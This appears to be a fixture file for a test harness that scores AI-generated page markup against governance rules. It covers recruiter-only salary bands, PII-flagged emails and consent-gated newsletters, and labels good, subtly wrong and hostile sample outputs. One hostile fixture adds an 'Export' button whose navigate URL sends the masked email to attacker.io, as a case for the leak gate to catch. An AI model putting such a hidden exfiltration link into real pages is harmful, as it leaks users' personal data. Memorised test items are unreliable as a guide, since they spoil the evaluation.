// The eval set: N page-authoring PROMPTS, each with hand-written "model outputs".
//
// No model is invoked. Each fixture is a stand-in for one model completion,
// labelled with the verdict the harness MUST return and (for failures) the gate
// that MUST catch it. The harness proves it scores these correctly (self-check),
// which is what licenses trusting the number when a real model is wired in.
//
// register: 'english' | 'canonical'  — lets the scorecard compare the two surfaces
//                                       (ADR-008 §4) once a model populates them.

const anonViewer = { canViewPii: false, canViewProtected: false, roles: [], consent: {} };

export const CASES = [
  // ── 1. The governance flagship (verbatim from the task) ────────────────────
  {
    id: 'careers',
    prompt:
      'a careers page with the salary band visible only to recruiters and the ' +
      'contact email marked as personal data',
    expect: {
      flags: [
        { label: 'salary band', text: '£120,000', require: { roles: ['recruiter'] },
          english: 'visible to recruiter', canonical: 'roles=recruiter' },
        { label: 'contact email', text: 'careers@northwind.health', require: { pii: true },
          english: 'contains personal data', canonical: 'pii' },
      ],
      leakProbe: { ctx: anonViewer, sensitive: ['£120,000', 'careers@northwind.health'] },
    },
    fixtures: [
      { label: 'good (english)', register: 'english', verdict: 'pass',
        source: `page "Careers" {
  heading "Join Northwind" level 1
  section visible to recruiter {
    heading "Compensation" level 2
    text "£120,000 – £160,000"
  }
  text "careers@northwind.health" contains personal data
}` },
      { label: 'good (canonical)', register: 'canonical', verdict: 'pass',
        source: `page "Careers" {
  heading "Join Northwind" level=1
  section roles=recruiter {
    heading "Compensation" level=2
    text "£120,000 – £160,000"
  }
  text "careers@northwind.health" pii
}` },
      // Compiles, schema-valid, LINTS CLEAN — and leaks the email. The dangerous one.
      { label: 'subtly-wrong: forgot pii on email', register: 'english', verdict: 'fail', failGate: 'leak',
        source: `page "Careers" {
  heading "Join Northwind" level 1
  section visible to recruiter {
    heading "Compensation" level 2
    text "£120,000 – £160,000"
  }
  text "careers@northwind.health"
}` },
      // Right shape, wrong role — no leak to anon, but breaks the stated intent.
      { label: 'subtly-wrong: role typo "recruiters"', register: 'english', verdict: 'fail', failGate: 'governance',
        source: `page "Careers" {
  heading "Join Northwind" level 1
  section visible to recruiters {
    heading "Compensation" level 2
    text "£120,000 – £160,000"
  }
  text "careers@northwind.health" contains personal data
}` },
      { label: 'hostile: invented atom "carousel"', register: 'english', verdict: 'fail', failGate: 'knownAtoms',
        source: `page "Careers" {
  carousel "openings"
  text "careers@northwind.health" contains personal data
}` },
      // A fully-correct-LOOKING governed page whose ONLY defect is an "Export"
      // button whose navigate URL silently exfiltrates the very PII the page masks
      // everywhere else (G5 class, by accident). Only the leak gate catches it.
      { label: 'hostile: navigate exfiltrates the email', register: 'canonical', verdict: 'fail', failGate: 'leak',
        source: `page "Careers" {
  section roles=recruiter {
    heading "Compensation" level=2
    text "£120,000 – £160,000"
  }
  text "careers@northwind.health" pii
  button "Export" on:click=navigate("https://attacker.io/?d=careers@northwind.health")
}` },
    ],
  },

  // ── 2. Consent-gated marketing ─────────────────────────────────────────────
  {
    id: 'newsletter',
    prompt:
      'a landing page with a hero and a newsletter block that only shows to ' +
      'visitors who consented to marketing',
    expect: {
      flags: [
        { label: 'newsletter block', text: 'Weekly product news', require: { consent: 'marketing' },
          english: 'needs marketing consent', canonical: 'consent=marketing' },
      ],
      leakProbe: { ctx: { ...anonViewer, consent: { marketing: false } }, sensitive: ['Weekly product news'] },
    },
    fixtures: [
      { label: 'good (english)', register: 'english', verdict: 'pass',
        source: `page "Home" {
  section {
    heading "Build faster" level 1
    text "The page builder that governs itself."
  }
  section needs marketing consent {
    heading "Newsletter" level 2
    text "Weekly product news, no spam."
    link "Subscribe" links to "#subscribe"
  }
}` },
      { label: 'subtly-wrong: newsletter always public', register: 'english', verdict: 'fail', failGate: 'leak',
        source: `page "Home" {
  section {
    heading "Build faster" level 1
    text "The page builder that governs itself."
  }
  section {
    heading "Newsletter" level 2
    text "Weekly product news, no spam."
    link "Subscribe" links to "#subscribe"
  }
}` },
      { label: 'hostile: image with no alt', register: 'canonical', verdict: 'fail', failGate: 'lint',
        source: `page "Home" {
  image src="/hero.png"
  section consent=marketing {
    text "Weekly product news, no spam."
  }
}` },
    ],
  },

  // ── 3. Ungoverned control — a clean page with NO governance need ────────────
  //     Proves the harness does not demand flags nobody asked for.
  {
    id: 'about',
    prompt: 'a simple about page with a heading and two short paragraphs',
    expect: {}, // no flags, no leak probe
    fixtures: [
      { label: 'good', register: 'canonical', verdict: 'pass',
        source: `page "About" {
  heading "About us" level=1
  text "We build tools for people who ship."
  text "We care about privacy by default."
}` },
      { label: 'hostile: heading level out of range', register: 'canonical', verdict: 'fail', failGate: 'lint',
        source: `page "About" {
  heading "About us" level=9
  text "hi"
}` },
    ],
  },
];

// The repaired follow-up for the flagship leak fixture — used to prove the repair
// loop CLOSES deterministically (subtly-wrong → structured instruction → fixed).
export const REPAIRED_CAREERS = `page "Careers" {
  heading "Join Northwind" level 1
  section visible to recruiter {
    heading "Compensation" level 2
    text "£120,000 – £160,000"
  }
  text "careers@northwind.health" contains personal data
}`;
